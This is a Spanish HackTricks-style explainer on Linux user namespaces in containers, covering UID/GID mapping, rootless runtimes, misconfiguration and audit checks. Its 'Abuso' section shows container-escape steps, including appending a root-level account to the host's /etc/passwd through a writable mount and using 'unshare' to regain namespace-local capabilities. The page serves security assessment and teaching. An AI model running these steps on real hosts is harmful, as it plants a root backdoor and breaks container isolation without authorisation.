# Espacio de nombres de usuario

{{#include ../../../../../banners/hacktricks-training.md}}

## Descripción general

El espacio de nombres de usuario cambia el significado de los user and group IDs permitiendo que el kernel mapee los IDs vistos dentro del namespace a IDs diferentes fuera de él. Esta es una de las protecciones modernas de contenedores más importantes porque aborda directamente el mayor problema histórico en los contenedores clásicos: **el root dentro del contenedor solía estar incómodamente cerca del root del host**.

Con los espacios de nombres de usuario, un proceso puede ejecutarse como UID 0 dentro del contenedor y aun así corresponder a un rango de UID sin privilegios en el host. Eso significa que el proceso puede comportarse como root para muchas tareas dentro del contenedor mientras que, desde el punto de vista del host, tiene mucho menos poder. Esto no resuelve todos los problemas de seguridad de contenedores, pero cambia las consecuencias de una compromisión del contenedor de forma significativa.

## Funcionamiento

Un espacio de nombres de usuario tiene archivos de mapeo como `/proc/self/uid_map` y `/proc/self/gid_map` que describen cómo los IDs del namespace se traducen a IDs del padre. Si el root dentro del namespace se mapea a un UID sin privilegios en el host, entonces operaciones que requerirían el root real del host simplemente no tienen la misma importancia. Por eso los espacios de nombres de usuario son centrales para **rootless containers** y por qué son una de las mayores diferencias entre los antiguos valores por defecto de contenedores con root y los diseños modernos de mínimo privilegio.

El punto es sutil pero crucial: el root dentro del contenedor no se elimina, se **traduce**. El proceso sigue experimentando un entorno similar a root localmente, pero el host no debe tratarlo como root completo.

## Laboratorio

Una prueba manual es:
```bash
unshare --user --map-root-user --fork bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
```
Esto hace que el usuario actual aparezca como root dentro del namespace, sin ser root en el host fuera de él. Es una de las mejores demostraciones simples para entender por qué los user namespaces son tan valiosos.

En contenedores, puedes comparar el mapeo visible con:
```bash
docker run --rm debian:stable-slim sh -c 'id && cat /proc/self/uid_map'
```
La salida exacta depende de si el motor está usando remapeo del user namespace o una configuración más tradicional con root.

También puedes leer el mapeo desde el host con:
```bash
cat /proc/<pid>/uid_map
cat /proc/<pid>/gid_map
```
## Uso en tiempo de ejecución

Rootless Podman es uno de los ejemplos más claros de tratar los espacios de nombres de usuario como un mecanismo de seguridad de primera clase. Rootless Docker también depende de ellos. El soporte de Docker para userns-remap mejora la seguridad en despliegues con daemon con privilegios (rootful) también, aunque históricamente muchos despliegues lo dejaron deshabilitado por razones de compatibilidad. El soporte de Kubernetes para espacios de nombres de usuario ha mejorado, pero la adopción y las configuraciones por defecto varían según el runtime, la distro y la política del clúster. Los sistemas Incus/LXC también dependen en gran medida del UID/GID shifting y de ideas de idmapping.

## Detalles avanzados del mapeo

Cuando un proceso no privilegiado escribe en `uid_map` o `gid_map`, el kernel aplica reglas más estrictas que las que aplica a un escritor privilegiado del namespace padre. Solo se permiten mapeos limitados, y para `gid_map` el escritor suele necesitar desactivar `setgroups(2)` primero:
```bash
cat /proc/self/setgroups
echo deny > /proc/self/setgroups
```
Este detalle importa porque explica por qué la configuración del espacio de nombres de usuario a veces falla en experimentos sin root y por qué los runtimes necesitan lógica auxiliar cuidadosa para la delegación de UID/GID.

Otra característica avanzada es el **montaje mapeado por ID**. En lugar de cambiar la propiedad en disco, un montaje mapeado por ID aplica un mapeo del espacio de nombres de usuario a un mount para que la propiedad aparezca traducida a través de esa vista del montaje. Esto es especialmente relevante en setups rootless y en runtimes modernos porque permite usar rutas compartidas del host sin operaciones recursivas de `chown`. Desde el punto de vista de la seguridad, la característica cambia cómo aparece un bind mount como escribible desde dentro del namespace, aunque no reescribe los metadatos subyacentes del sistema de archivos.

Finalmente, recuerda que cuando un proceso crea o entra en un nuevo espacio de nombres de usuario, recibe un conjunto completo de capacidades **dentro de ese namespace**. Eso no significa que de repente haya ganado poder global sobre el host. Significa que esas capacidades solo pueden usarse donde el modelo de namespaces y otras protecciones lo permitan. Por eso `unshare -U` puede, de repente, hacer posibles operaciones privilegiadas locales al namespace, como montar, sin eliminar directamente la frontera de root del host.

## Mala configuración

La principal debilidad es simplemente no usar espacios de nombres de usuario en entornos donde serían factibles. Si el root del contenedor se mapea demasiado directamente al root del host, los mounts del host que son escribibles y las operaciones privilegiadas del kernel se vuelven mucho más peligrosas. Otro problema es forzar el compartido del espacio de nombres de usuario del host o desactivar el remapeo por compatibilidad sin reconocer cuánto cambia eso el límite de confianza.

Los espacios de nombres de usuario también deben considerarse junto con el resto del modelo. Incluso cuando están activos, una API de runtime ampliamente expuesta o una configuración de runtime muy débil aún pueden permitir la escalada de privilegios por otras vías. Pero sin ellos, muchas clases antiguas de breakout se vuelven mucho más fáciles de explotar.

## Abuso

Si el contenedor tiene root sin separación del espacio de nombres de usuario, un bind mount del host escribible se vuelve mucho más peligroso porque el proceso realmente podría estar escribiendo como root del host. Las capacidades peligrosas igualmente adquieren más significado. El atacante ya no necesita esforzarse tanto contra la frontera de traducción porque esa frontera apenas existe.

La presencia o ausencia del espacio de nombres de usuario debe comprobarse temprano al evaluar una ruta de breakout de contenedor. No responde todas las preguntas, pero muestra inmediatamente si "root in container" tiene relevancia directa sobre el host.

El patrón de abuso más práctico es confirmar el mapeo y luego probar inmediatamente si el contenido montado desde el host es escribible con privilegios relevantes para el host:
```bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
touch /host/tmp/userns_test 2>/dev/null && echo "host write works"
ls -ln /host/tmp/userns_test 2>/dev/null
```
Si el archivo se crea como el host root real, el aislamiento del user namespace queda efectivamente ausente para esa ruta. En ese punto, los abusos clásicos de host-file se vuelven realistas:
```bash
echo 'x:x:0:0:x:/root:/bin/bash' >> /host/etc/passwd 2>/dev/null || echo "passwd write blocked"
cat /host/etc/passwd | tail
```
Una confirmación más segura en una evaluación en vivo es escribir un marcador benigno en lugar de modificar archivos críticos:
```bash
echo test > /host/root/userns_marker 2>/dev/null
ls -l /host/root/userns_marker 2>/dev/null
```
Estas comprobaciones importan porque responden rápidamente a la pregunta real: ¿mapea root en este container lo suficientemente cerca al host root como para que un writable host mount se convierta inmediatamente en una ruta de compromiso del host?

### Ejemplo completo: Recuperando Namespace-Local Capabilities

Si seccomp permite `unshare` y el entorno permite una nueva user namespace, el proceso puede recuperar un full capability set dentro de esa nueva namespace:
```bash
unshare -UrmCpf bash
grep CapEff /proc/self/status
mount -t tmpfs tmpfs /mnt 2>/dev/null && echo "namespace-local mount works"
```
Esto no es, por sí mismo, un host escape. La razón por la que importa es que user namespaces pueden volver a habilitar acciones namespace-local privilegiadas que luego se combinan con mounts débiles, kernels vulnerables o runtime surfaces mal expuestas.

## Comprobaciones

Estos comandos están pensados para responder la pregunta más importante en esta página: ¿a qué se mapea root dentro de este container en el host?
```bash
readlink /proc/self/ns/user   # User namespace identifier
id                            # Current UID/GID as seen inside the container
cat /proc/self/uid_map        # UID translation to parent namespace
cat /proc/self/gid_map        # GID translation to parent namespace
cat /proc/self/setgroups 2>/dev/null   # GID-mapping restrictions for unprivileged writers
```
- Si el proceso es UID 0 y los maps muestran un host-root mapping directo o muy cercano, el contenedor es mucho más peligroso.
- Si root se mapea a un rango de host sin privilegios, eso es una línea base mucho más segura y normalmente indica un aislamiento real de user namespace.
- Los archivos de mapping son más valiosos que `id` por sí solos, porque `id` solo muestra la identidad local del namespace.

Si la carga de trabajo se ejecuta como UID 0 y el mapping muestra que esto corresponde estrechamente con host root, deberías interpretar el resto de los privilegios del contenedor de forma mucho más estricta.
{{#include ../../../../../banners/hacktricks-training.md}}
